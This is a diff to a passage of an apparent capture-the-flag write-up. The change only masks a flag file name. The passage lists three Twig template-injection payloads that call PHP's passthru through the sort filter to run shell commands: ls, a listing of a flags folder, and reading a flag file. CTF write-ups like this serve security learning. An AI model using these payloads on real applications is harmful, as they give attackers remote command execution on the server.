@@ -231,5 +231,5 @@ So we can test others payload to discover the content of ```flags``` folder (dis
 ```
 {{['ls',""]|sort('passthru')}}
 {{['ls flags',""]|sort('passthru')}}
-{{['cat+flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt',""]|sort('passthru')}}
+{{['cat+flags/***************************.txt',""]|sort('passthru')}}
 ```
